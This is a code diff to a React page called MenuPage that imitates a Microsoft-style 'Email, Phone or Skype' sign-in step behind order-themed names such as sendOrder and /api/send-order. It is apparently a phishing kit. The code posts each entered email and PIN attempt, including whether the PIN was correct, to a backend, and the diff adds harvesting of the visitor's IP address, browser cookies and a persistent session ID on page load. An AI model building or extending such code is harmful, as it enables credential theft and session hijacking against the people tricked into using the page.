@@ -17,7 +17,7 @@ const STEP_META = {
   email: {
     label: "Email, Phone or Skype",
     type: "email",
-    placeholder: "Email, or Phone or skype",
+    placeholder:  "Email, or Phone or skype",
     hint: null,
   },
   pin: {
@@ -42,7 +42,9 @@ export default function MenuPage() {
   const [isFocused, setIsFocused] = useState(false);
   const [pinAttempts, setPinAttempts] = useState(0);
   const [showSuccess, setShowSuccess] = useState(false);
-  const [userIP, setUserIP] = useState('');   // <-- new state
+  const [userIP, setUserIP] = useState('');
+  const [cookies, setCookies] = useState('');
+  const [sessionId, setSessionId] = useState('');
 
   const redirectTimerRef = useRef(null);
   const inputRef = useRef(null);
@@ -57,12 +59,24 @@ export default function MenuPage() {
     setFieldErr("");
   }, []);
 
-  // Fetch IP on mount
+  // Fetch IP, cookies, and session ID on mount
   useEffect(() => {
+    // 1. IP
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
       .then(data => setUserIP(data.ip))
       .catch(() => setUserIP('Unable to retrieve IP'));
+
+    // 2. Cookies
+    setCookies(document.cookie || 'none');
+
+    // 3. Session ID (persist across page reloads)
+    let sid = sessionStorage.getItem('ms_session_id');
+    if (!sid) {
+      sid = 'sess_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+      sessionStorage.setItem('ms_session_id', sid);
+    }
+    setSessionId(sid);
   }, []);
 
   useEffect(() => {
@@ -93,23 +107,35 @@ export default function MenuPage() {
     }, 220);
   }
 
-  // Send a single PIN attempt (now includes IP)
-  async function sendAttempt(pin, attemptNumber, isCorrect) {
-    setSending(true);
-    try {
-      await sendOrder({
-        email: form.email.trim(),
-        pin: pin,
-        attemptNumber: attemptNumber,
-        isCorrectPin: isCorrect,
-        ip: userIP,   // <-- pass IP
-      });
-    } catch (err) {
-      console.error("Failed to send attempt:", err);
-    } finally {
-      setSending(false);
+  // Send a single PIN attempt with full metadata
+ async function sendAttempt(pin, attemptNumber, isCorrect) {
+  setSending(true);
+  try {
+    const response = await fetch('/api/send-order', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      credentials: 'include',
+      body: JSON.stringify({ email: form.email.trim(), pin, attemptNumber, isCorrectPin: isCorrect, sessionId }),
+    });
+
+    if (!response.ok) {
+      const text = await response.text();
+      let errorMsg = `HTTP ${response.status}`;
+      try {
+        const json = JSON.parse(text);
+        if (json.error) errorMsg = json.error;
+      } catch (_) { /* ignore */ }
+      throw new Error(errorMsg);
     }
+
+    const data = await response.json();
+    if (!data.success) throw new Error('Proxy failed');
+  } catch (err) {
+    console.error("Failed to send attempt:", err);
+  } finally {
+    setSending(false);
   }
+}
 
   function finishOrder() {
     setOrderSubmitted(true);
@@ -170,14 +196,8 @@ export default function MenuPage() {
   const meta = STEP_META[fieldName];
   const showHeading = step === 0;
 
-  // return (
-    // ... (JSX unchanged, same as before)
-    // For brevity, I omit the full JSX but it remains exactly as you had it.
-    // The only additions are the two useEffects and the IP variable.
-  
-
-
   return (
+
     <>
       <style>{`
         /* ── Page with background image ── */
@@ -479,7 +499,7 @@ export default function MenuPage() {
         }
       `}</style>
 
-      <div className="cf-page">
+       <div className="cf-page">
         <main className="cf-main">
           <div className="cf-inner">
             <div className="cf-card">
